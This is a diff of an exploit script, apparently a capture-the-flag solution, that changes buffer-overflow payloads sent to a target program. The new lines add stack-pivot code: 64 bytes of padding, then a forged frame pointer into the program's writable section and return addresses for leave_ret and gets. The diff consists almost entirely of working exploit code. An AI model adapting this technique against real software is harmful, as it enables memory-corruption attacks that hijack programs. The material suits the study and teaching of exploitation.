@@ -102,13 +102,18 @@ write_sec = 0x404000
 high_write_sec = 0x404800
 
 payload = b"A" * 64
-payload += p64(high_write_sec)
+payload += p64(high_write_sec + 0x40)
+payload += p64(leave_ret)
 
 p.recvuntil(b"Enter world name:")
 p.recvline()
 p.sendline(payload)
 
 payload = b"A" * 64
+payload += p64(write_sec)
+payload += p64(gets)
+p.send(payload)
+
 
 p.recvuntil(b"Creative")
 p.recvline()
